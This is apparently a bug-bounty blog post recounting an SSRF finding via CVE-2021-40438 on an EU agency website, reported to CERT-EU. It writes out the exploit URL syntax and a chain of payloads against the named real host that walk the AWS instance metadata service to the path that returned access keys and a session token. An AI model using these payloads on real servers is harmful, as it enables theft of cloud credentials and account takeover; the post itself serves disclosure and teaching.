# SSRF Attack Leading To AWS Metadata

SSRF ATTACK LEADING TO AWS METADATA
ParagBagul
Follow
4 min read
·
Sep 18, 2022

90

Hello folks,

I would like to share the recent successful Disclosure of server-side request forgery that I found.

#What is server-side request forgery?

Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.

#The finding:

While doing subdomain enumeration on target [ europe.eu ] . I found the subdomain which was [eea.europa.eu ] that was vulnerable to CVE-2021–40438.

while doing research about CVE-2021–40438 I found something interesting.

Press enter or click to view image in full size
#What is CVE-2021–40438?

Apache released version 2.4.49 of HTTP Server, which included a fix for CVE-2021–40438, a critical server-side request forgery (SSRF) vulnerability affecting Apache HTTP Server 2.4.48 and earlier versions. The vulnerability resides in mod_proxy and allows remote, unauthenticated attackers to force vulnerable HTTP servers to forward requests to arbitrary servers — giving them the ability to obtain or tamper with resources that would potentially otherwise be unavailable to them.

#What have affected versions that are vulnerable to CVE-2021–40438?

All Apache HTTP Server versions up to 2.4.48 are vulnerable if mod_proxy is in use. CVE-2021–40438 is patched in Apache HTTP Server 2.4.49 and later.

#The exploitation of Apache HTTP Server CVE-2021–40438

To exploit the SSRF I used the below payload collection for exploitation

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md

Simple SSRF payloads were not working……….

Then I decided to check for SSRF payloads for cloud instances. So i decided to use the payload of magic IP.

What is magic IP?

The 169.254.169.254 IP address is a “magic” IP in the cloud world, in AWS it is used to retrieve user data and instance metadata specific to the instance. after this I crafted my SSRF like below

Exploit syntax;

https://vulnerablewebsite/?unix:bunchofAAAA|http://ssrfpayload/

Real exploitation:

https://www.eea.europa.eu/?unix:|http://169.254.169.254/

After that, I opened the same payload in the browser, and BOOM 💥

Get ParagBagul’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I was able to list AWS Instance files and directories.

Press enter or click to view image in full size
Full private data access

after that I tried the payload below

https://eea.europa.eu/?unix:bunchofA|http://169.254.169.254/latest

Press enter or click to view image in full size

Then again I crafted my payload to view the contents inside the meta-data folder.

https://eea.europa.eu/?unix:bunchofA|http://169.254.169.254/latest/meta-data

Press enter or click to view image in full size

Again I crafted a payload for reading the public hostname.

https://eea.europa.eu/?unix:bunchofA|http://169.254.169.254/latest/meta-data/public-hostname

Press enter or click to view image in full size

hmm… then again I crafted my payload as mentioned below

https://eea.europa.eu/?unix:bunchofA|http://169.254.169.254/latest/meta-data/identity-credentials/ec2/

Press enter or click to view image in full size

There were two directories on the cloud instance. Now time to craft the final payload.

Final payload:

https://eea.europa.eu/?unix:bunchofA|http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

In response, I was able to extract AccessKeyID, SecrectAccessKey, and Token of the cloud instance.

Press enter or click to view image in full size
extracted AWS secret key and Token

After this, I created my vulnerability report and ethically reported the vulnerability to CERT-EU after 3 days I got the response

Press enter or click to view image in full size

So finally the hard work pays off !!!!!!!!!!!!!!!!

keep hacking and keep reporting :-)

Press enter or click to view image in full size
CERT-EU Hall of Fame

Thank you,

Parag Bagul!!

HaxWizard
